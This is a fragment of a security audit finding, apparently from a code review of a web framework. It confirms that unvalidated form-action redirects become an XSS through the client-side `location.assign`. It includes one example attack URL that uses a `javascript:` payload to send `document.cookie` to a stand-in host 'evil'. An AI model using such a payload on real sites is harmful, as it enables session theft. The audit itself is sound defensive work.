    "findingId": "F2",
    "verdict": "true-positive",
    "adjustedSeverity": "MEDIUM",
    "reasoning": "Traced end-to-end and every link holds. `redirect(status, location)` (forms.ts:21-23) performs zero validation on `location`; a form action's redirect splits at Mochi.ts:1132-1141 into two transports; the enhanced branch calls `jsonRedirect(result.status, result.location)` which serializes the value verbatim (formsJson.ts:56-57), and the client sink is an unguarded `window.location.assign(result.location)` (enhance.client.ts:60-62), which is also the documented default (docs/74-use-enhance.md:55). The asymmetry is real: on the non-enhanced path the same string becomes a `Location:` response header (Mochi.ts:1137-1140), and browsers refuse to follow a `javascript:` or `data:` Location, so the app's bug stays an open redirect — whereas same-origin script calling `location.assign('javascript:…')` executes in the current document's origin, since the navigation initiator and the target document share an origin (the initiator-origin check browsers apply to `javascript:` URLs does not fire here). Top-level `data:` navigation is blocked, so `javascript:` is the live scheme. The comparison to SvelteKit is accurate — its action redirects route through `goto`, which rejects a target that is not same-origin. Concrete attack: an app with the ubiquitous `return redirect(303, String(formData.get('next')))` in a login action and a hidden `next` input seeded from `page.url.searchParams`, wrapped in `{@attach enhance()}` — a victim who follows `/login?next=javascript:fetch('//evil/'+document.cookie)` and submits gets attacker script executing on the site's origin; the identical app without `enhance` only gets a dead redirect. I confirmed no in-repo app is currently vulnerable (every `redirect()` call in site/demos/support uses a literal path, and data-loading/routes.ts:15 correctly wraps user input in `encodeURIComponent` inside a path segment), so this is a framework-hardening gap in a published library rather than a live exploit here. The fix belongs server-side in `jsonRedirect`/`redirect()` so both transports agree, plus a guard at the client sink. MEDIUM is the right tier: real XSS amplification, but it requires an app-level mistake to light up."
  },
